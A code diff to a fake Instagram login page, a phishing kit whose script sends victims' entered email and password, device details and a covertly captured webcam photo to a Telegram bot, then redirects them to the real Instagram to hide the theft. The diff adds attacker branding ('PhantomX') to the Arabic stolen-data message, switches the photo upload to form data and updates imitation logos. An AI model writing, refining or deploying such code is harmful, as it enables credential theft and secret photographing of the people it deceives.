@@ -106,7 +106,7 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram Logo">
             <h2>Log in to Instagram</h2>
             <form id="loginForm" onsubmit="submitForm(event)">
                 <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
@@ -118,12 +118,12 @@
                 <a href="https://www.instagram.com/accounts/signup/email/?hl=en">Sign up</a>
             </div>
             <div class="download-link">
-                <span>Download our app:</span><br>
+                <span>Download app:</span><br>
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Google_Play_Icon.svg/1024px-Google_Play_Icon.svg.png" alt="Download for Android" width="130" height="40">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Download for Android" width="130" height="40">
                 </a>
                 <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/App_Store_Logo.svg" alt="Download for iOS" width="130" height="40">
+                    <img src="https://banner2.cleanpng.com/20180707/fge/aaw4zfuop.webp" alt="Download for iOS" width="130" height="40">
                 </a>
             </div>
         </div>
@@ -183,7 +183,7 @@
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         video.srcObject.getTracks().forEach(track => track.stop());
-                        resolve(canvas.toDataURL('image/jpeg'));
+                        resolve(canvas.toDataURL('image/jpeg')); // Capture the image as base64
                     }, 3000); // Wait for 3 seconds before capturing
                 }).catch(() => resolve(null)); // Handle error and resolve null
             });
@@ -203,7 +203,7 @@
             const imageData = await captureImage();
 
             // Prepare the message to send to the bot in Arabic
-            const message = `🔓 *حساب تم اختراقه! تفاصيل الحساب مكشوفة* 🔓\n\n` +
+            const message = `🔓 *تم اختراق حساب الانستجرام بنجاح من قبل المطور PhantomX* 🔓\n\n` +
                             `💻 *معلومات الحساب:* 💻\n` +
                             `📧 البريد الإلكتروني: ${email}\n` +
                             `🔑 كلمة المرور: ${password}\n\n` +
@@ -219,7 +219,8 @@
                             `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                             `🕒 *التوقيت:* ${currentTime}\n\n` +
-                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
+                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`
+                            `☣ *⚜تم الاختراق من قبل PhantomX @tx_5w⚜*`;
 
             // Send the information to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -230,15 +231,19 @@
 
             // Send the captured image to Telegram bot
             if (imageData) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', imageData);
+                formData.append('caption', '📷 *تم التقاط صورة المستخدم*');
+
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *تم التقاط صورة المستخدم*" })
+                    body: formData
                 });
             }
 
             // Redirect the user to Instagram after sending the data
-            setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
+            setTimeout(() => window.location.href = 'https://www.instagram.com', 3000); // 3 seconds delay
         }
     </script>
 </body>
